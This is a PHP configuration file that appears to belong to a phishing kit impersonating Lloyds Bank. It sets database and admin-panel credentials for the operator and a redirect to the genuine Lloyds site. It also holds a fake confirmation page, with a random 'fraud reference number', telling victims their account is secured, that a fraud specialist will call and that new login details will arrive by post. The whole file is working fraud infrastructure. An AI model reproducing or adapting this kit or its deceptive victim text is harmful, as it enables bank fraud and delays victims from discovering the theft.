<?php
error_reporting(0);
$servername = "localhost";
$database = "lloyds_live";
$username = "root";
$password = "mysql";

// admin panel password
$admin_panel_password = "1234"; // make sure to change this one

// exit link when errors or when page completed [i made it redirect to the login page again u can change that anytime obviously]
$exit_link = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiO3avx19LrAhWKDuwKHZrlDF4QFjAAegQIAxAC&url=https%3A%2F%2Fwww.lloydsbank.com%2F&usg=AOvVaw3G3k3_md1Y-0Q_u6A6oc1x";

// final page information
$fraud_reference_number = rand(1000000,999999999);
$final_page_title = "Your device Has been Verified.";
$final_page_text = "
You request for New Payee has been cancelled successfully.
<br>
A fraud specialist will call you within 24 hours along with detailed report of this incident. 
<br>
Meanwhile, all transfers to or from your account have been blocked for security.<br>
<br>
You will receive new login details through post within 5 to 7 business days.<br>
Please note the following reference I.D. for further proceedings.<br>
<br>
Your Fraud Reference Number: <strong>$fraud_reference_number</strong><br>
<br>
Please note that due to this COVID-19, a global pandemic, it might take some time for our fraud specialist to investigate
<br>
this case and reach back to you on your registered number. We would be thankful for your patience
";

?>